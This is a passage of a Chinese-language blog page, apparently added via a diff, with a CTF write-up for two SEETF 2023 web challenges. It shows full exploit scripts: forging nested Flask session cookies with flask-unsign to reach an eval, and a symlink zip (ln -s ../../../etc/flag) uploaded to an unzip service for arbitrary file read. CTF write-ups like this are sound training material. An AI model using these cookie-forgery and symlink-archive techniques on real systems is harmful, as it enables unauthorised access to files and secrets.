class="line"></span><br></pre></td></tr></table></figure>
+<p>先看一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/福&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fortold</span>():</span><br><span class="line">	keys.clear()</span><br><span class="line">	start = request.form.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">	app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = start</span><br><span class="line">	replace_secret_key()</span><br><span class="line"></span><br><span class="line">	value = [secret(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">	result = solve(*value)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">eval</span>(<span class="built_in">chr</span>(result))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Bad Luck.&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>接受一个key，调用replace_secret_key()，然后将value传入solve，最后eval result</p>
+<p>对于replace_secret_key()将会递归一样的使用decrypt_cookie解密cookie，最后在含有end的情况下停止，然后将这几层key传入solve，放回e，之后eval(chr(e))</p>
+<p>，那么解题思路就是先找到满足solve函数的字符串，然后递归加密key，传入即可，那么最终要得到的e是<code>福</code>这个字符，因为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> flag:</span><br><span class="line">	contents = flag.read()</span><br><span class="line">	福 = contents.strip()</span><br></pre></td></tr></table></figure>
+<p>那么首先先得到福的数值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;福&#x27;</span>)==<span class="number">31119</span></span><br></pre></td></tr></table></figure>
+<p>然后找到a-f的数值</p>
+<p><a target="_blank" rel="noopener" href="https://www.wolframalpha.com/input?i=solve+%28a%5E3%29%28b%5E2%2Bc%5E2%29%282d%2B1%29++%3D++%2831119%5E3%29%2B%2888888%5E3%29+over+the+integers+">https://www.wolframalpha.com/input?i=solve+(a^3)(b^2%2Bc^2)(2d%2B1)++%3D++(31119^3)%2B(88888^3)+over+the+integers+</a></p>
+<p>需要进行调整，数值整体会偏大</p>
+<p><a target="_blank" rel="noopener" href="https://www.wolframalpha.com/input?i=solve+%2841%5E3%29%28b%5E2%2Bc%5E2%29%282d%2B1%29++%3D++%2831119%5E3%29%2B%2888888%5E3%29+over+the+integers+">https://www.wolframalpha.com/input?i=solve+(41^3)(b^2%2Bc^2)(2d%2B1)++%3D++(31119^3)%2B(88888^3)+over+the+integers+</a></p>
+<p>然后通过脚本获得相应的字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">value</span>):</span><br><span class="line">	random.seed(value)</span><br><span class="line">	<span class="keyword">return</span> random.randint(<span class="number">8</span>, <span class="number">88888</span>)</span><br><span class="line"></span><br><span class="line">values_to_find = [<span class="number">41</span>, <span class="number">1728</span>, <span class="number">803</span>, <span class="number">1463</span>, <span class="number">88888</span>]</span><br><span class="line">found_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>, repeat=<span class="number">4</span>):</span><br><span class="line">	input_value = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">	result = secret(input_value)</span><br><span class="line">	<span class="keyword">if</span> result <span class="keyword">in</span> values_to_find:</span><br><span class="line">		found_values.append(input_value)</span><br><span class="line">		values_to_find.remove(result)</span><br><span class="line">		<span class="built_in">print</span>(result,input_value)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> values_to_find:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">//<span class="number">1728</span> aqoi</span><br><span class="line">//<span class="number">1463</span> aucl</span><br><span class="line">//<span class="number">88888</span> bphi</span><br><span class="line">//<span class="number">41</span> cdsn</span><br><span class="line">//<span class="number">803</span> ewmu</span><br></pre></td></tr></table></figure>
+<p>然后生成出session</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">SECRET_KEYS = [<span class="string">&quot;cdsn&quot;</span>,<span class="string">&quot;aqoi&quot;</span>,<span class="string">&quot;ewmu&quot;</span>,<span class="string">&quot;aucl&quot;</span>,<span class="string">&quot;bphi&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">secret_key,index=<span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span> index == <span class="built_in">len</span>(SECRET_KEYS):</span><br><span class="line">		cmd_out = subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;&quot;end&quot;: &quot;&#x27;</span> + secret_key + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, secret_key])</span><br><span class="line">		<span class="keyword">return</span> cmd_out.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		session_hash = generate_cookie(SECRET_KEYS[index], index+<span class="number">1</span>)</span><br><span class="line">		cmd_out = subprocess.check_output([<span class="string">&#x27;flask-unsign&#x27;</span>, <span class="string">&#x27;--sign&#x27;</span>, <span class="string">&#x27;--cookie&#x27;</span>, <span class="string">&#x27;&#123;&quot;key&quot;: &quot;&#x27;</span> + SECRET_KEYS[index] + <span class="string">&#x27;&quot;,&quot;session&quot;:&quot;&#x27;</span> + session_hash + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;--secret&#x27;</span>, secret_key])</span><br><span class="line">		<span class="keyword">return</span> cmd_out.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">cookie = &#123;<span class="string">&#x27;session&#x27;</span> : generate_cookie(SECRET_KEYS[<span class="number">0</span>])&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;cdsn&#x27;</span>&#125;</span><br><span class="line">response = requests.post(<span class="string">&#x27;http://福.web.seetf.sg:1337/%E7%A6%8F&#x27;</span>, cookies=cookie, data=data, proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://localhost:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cdsn:41</span></span><br><span class="line"><span class="string">aqoi:1728</span></span><br><span class="line"><span class="string">ewmu:803</span></span><br><span class="line"><span class="string">aucl:1463</span></span><br><span class="line"><span class="string">bphi:88888</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Throw-your-malware-here">Throw your malware here!</h2>
+<p>后端代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, HTTPException, UploadFile</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> JSONResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FILE_CACHE = Path(<span class="string">&quot;/app/cache&quot;</span>)</span><br><span class="line">FLOSS_PATH = Path(<span class="string">&quot;/usr/local/bin/floss&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_string</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">16</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># choose from all lowercase letter</span></span><br><span class="line">    letters = string.ascii_lowercase</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(random.choice(letters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.on_event(<span class="params"><span class="string">&quot;startup&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">startup</span>():</span><br><span class="line">    <span class="comment"># Ensure caches exist</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> FILE_CACHE.is_dir():</span><br><span class="line">        FILE_CACHE.mkdir()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_floss</span>(<span class="params">target: Path</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    args = [<span class="built_in">str</span>(target), <span class="string">&quot;--json&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pefile.PE(name=<span class="built_in">str</span>(target))</span><br><span class="line">    <span class="keyword">except</span> pefile.PEFormatError:</span><br><span class="line">        args.extend((<span class="string">&quot;--only&quot;</span>, <span class="string">&quot;static&quot;</span>))</span><br><span class="line">    output = subprocess.check_output((FLOSS_PATH, *args))</span><br><span class="line">    <span class="keyword">return</span> output.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/floss&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">floss_endpoint</span>(<span class="params">sample: UploadFile, password: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; JSONResponse:</span><br><span class="line">    random_path = get_random_string()</span><br><span class="line">    <span class="keyword">while</span> (target_path := FILE_CACHE / random_path).exists():</span><br><span class="line">        random_path = get_random_string()</span><br><span class="line">    <span class="keyword">with</span> target_path.<span class="built_in">open</span>(<span class="string">&quot;wb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        shutil.copyfileobj(sample.file, f)</span><br><span class="line">    is_zipfile = zipfile.is_zipfile(target_path)</span><br><span class="line">    <span class="keyword">if</span> is_zipfile:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(target_path) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="comment"># No zip bombs!</span></span><br><span class="line">            file_size_sum = <span class="built_in">sum</span>(data.file_size <span class="keyword">for</span> data <span class="keyword">in</span> f.filelist)</span><br><span class="line">            compressed_size_sum = <span class="built_in">sum</span>(data.compress_size <span class="keyword">for</span> data <span class="keyword">in</span> f.filelist)</span><br><span class="line">            <span class="keyword">if</span> (file_size_sum / compressed_size_sum &gt; <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">raise</span> HTTPException(<span class="number">413</span>, <span class="string">&quot;Zip Bomb Detected&quot;</span>)</span><br><span class="line"></span><br><span class="line">            zipobjects = f.infolist()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(zipobject.file_size &gt; <span class="number">50000</span> <span class="keyword">for</span> zipobject <span class="keyword">in</span> zipobjects):</span><br><span class="line">                <span class="keyword">raise</span> HTTPException(<span class="number">418</span>, <span class="string">&quot;I&#x27;m a teapot!&quot;</span>)</span><br><span class="line">            files = f.namelist()</span><br><span class="line">        args = [<span class="string">&quot;unzip&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> password:</span><br><span class="line">            args.extend((<span class="string">&quot;-P&quot;</span>, password))</span><br><span class="line">        args.extend((<span class="built_in">str</span>(target_path), <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;FILE_CACHE / random_path&#125;</span>-zip&quot;</span>))</span><br><span class="line">        a = subprocess.run(args)</span><br><span class="line">        <span class="keyword">if</span> a.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> HTTPException(<span class="number">422</span>, <span class="string">&quot;Invalid password!&quot;</span>)</span><br><span class="line">        targets = [FILE_CACHE / <span class="string">f&quot;<span class="subst">&#123;random_path&#125;</span>-zip&quot;</span> / file <span class="keyword">for</span> file <span class="keyword">in</span> files]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        targets = [target_path]</span><br><span class="line">    results = [run_floss(target) <span class="keyword">for</span> target <span class="keyword">in</span> targets]</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        &#123;target.name: result <span class="keyword">for</span> target, result <span class="keyword">in</span> <span class="built_in">zip</span>(targets, results)&#125;</span><br><span class="line">        <span class="keyword">if</span> is_zipfile</span><br><span class="line">        <span class="keyword">else</span> results[<span class="number">0</span>]</span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>floss路由允许我们上传一个具有密码的zip文件，然后使用unzip解压文件，将每一个文件调用 FLOSS 来执行分析。输出作为 JSON 响应返回。那么使用zipslip漏洞就可以实现任意文件读取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../etc/flag flag.link</span><br><span class="line">zip -P flag --symlink flag.zip flag.link</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要上传的文件</span></span><br><span class="line">files = &#123;<span class="string">&#x27;sample&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;flag.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://ip:port/floss?password=flag&#x27;</span>, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>diffany
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gudiffany.github.io/2023/08/18/13-21-58/" title="2023SEETF">https://gudiffany.github.io/2023/08/18/13-21-58/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/2023ctf/" rel="tag"><i class="fa fa-tag"></i> 2023ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/16/17-56-07/" rel="prev" title="java-Servlet">
+                  <i class="fa fa-chevron-left"></i> java-Servlet
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/19/00-07-56/" rel="next" title="Java再会反序列化">
+                  Java再会反序列化 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diffany</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+
+
+  <script src="[object Object]"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+
+
+<script>
+var options = {
+  bottom: '64px', // default: '32px'
+  right: 'unset', // default: '32px'
+  left: '32px', // default: 'unset'
+  time: '0.5s', // default: '0.3s'
+  mixColor: '#fff', // default: '#fff'
+  backgroundColor: '#fff',  // default: '#fff'
+  buttonColorDark: '#100f2c',  // default: '#100f2c'
+  buttonColorLight: '#fff', // default: '#fff'
+  saveInCookies: true, // default: true,
+  label: '🌓', // default: ''
+  autoMatchOsTheme: true // default: true
+}
+const darkmode = new Darkmode(options);
+darkmode.showWidget();
+</script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://unpkg.com/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ImshWy4c6kiRqFukNXuAeVYt-gzGzoHsz","app_key":"I15dpBmlxhPPxNgS0pn9Fer5","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://unpkg.com/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
